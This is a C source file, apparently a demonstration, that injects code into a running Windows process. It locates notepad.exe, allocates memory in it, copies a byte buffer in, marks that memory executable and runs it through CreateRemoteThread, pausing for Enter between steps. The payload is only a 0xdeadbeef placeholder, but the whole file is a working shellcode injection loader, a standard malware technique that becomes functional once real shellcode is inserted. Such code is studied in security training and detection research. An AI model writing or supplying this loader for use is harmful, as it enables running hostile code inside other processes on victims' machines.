#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

unsigned char data[] = {
	0xde,0xad,0xbe,0xef
};

SIZE_T dataLen = sizeof(data);

int FindProc(LPCWSTR procName) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procName, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


int main() {
	HANDLE hProcess = NULL;
	PVOID pBufAddress = NULL;
	SIZE_T dwNumBytesWritten = NULL;
	DWORD dwOldProtect = NULL;

	int pid = FindProc(L"notepad.exe");

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	pBufAddress = VirtualAllocEx(hProcess, NULL, dataLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pBufAddress == NULL) {
		printf("[!!] VirtualAllocEx failed with error: %d \n", GetLastError());
		return -1;
	}

	printf("[+] Allocated remote buffer at 0x%p for process with ID %d \n", pBufAddress, pid);
	printf("[!] Press <Enter> to continue...\n");
	getchar();

	if (!WriteProcessMemory(hProcess, pBufAddress, data, dataLen, &dwNumBytesWritten) || dwNumBytesWritten != dataLen) {
		printf("[!!] WriteProcessMemory failed with error: %d \n", GetLastError());
		return -1;
	}

	printf("[+] Wrote %d bytes\n", dwNumBytesWritten);
	printf("[!] Press <Enter> to continue...\n");
	getchar();

	if (!VirtualProtectEx(hProcess, pBufAddress, dataLen, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
		printf("[!!] VirtualProtectEx failed with error: %d \n", GetLastError());
		return -1;
	}

	printf("[+] Changed page permissions to RWX...\n");
	printf("[!] Press <Enter> to continue...\n");
	getchar();

	if (CreateRemoteThread(hProcess, NULL, NULL, pBufAddress, NULL, NULL, NULL) == NULL) {
		printf("[!!] CreateRemoteThread failed with error: %d \n", GetLastError());
		return -1;
	}

	printf("[+] Done.\n");

	return 0;
}
